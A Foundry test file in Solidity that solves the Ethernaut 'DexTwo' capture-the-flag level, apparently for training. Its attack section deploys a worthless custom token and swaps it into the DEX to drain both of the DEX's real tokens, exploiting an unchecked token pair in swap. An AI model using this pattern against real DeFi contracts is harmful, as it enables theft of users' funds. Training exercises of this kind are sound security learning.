// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console2.sol";
import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "../src/levels/23-DexTwo/DexTwoFactory.sol";
import "../src/levels/23-DexTwo/MyToken.sol";

contract DexTwoTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();

        // set hacker's balance to 1 Ether, use it when you need!
        vm.deal(hacker, 1 ether);
    }

    function testDexTwoHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        vm.startPrank(hacker, hacker);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(dexTwoFactory);
        DexTwo ethernautDexTwo = DexTwo(levelAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // implement your solution here
        address token1 = ethernautDexTwo.token1();
        address token2 = ethernautDexTwo.token2();
        MyToken myToken = new MyToken(400);

        ethernautDexTwo.approve(address(ethernautDexTwo), type(uint256).max);
        myToken.transfer(address(ethernautDexTwo), 100);
        myToken.approve(address(ethernautDexTwo), type(uint256).max);
        ethernautDexTwo.swap(address(myToken), token1, 100);
        ethernautDexTwo.swap(address(myToken), token2, 200);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
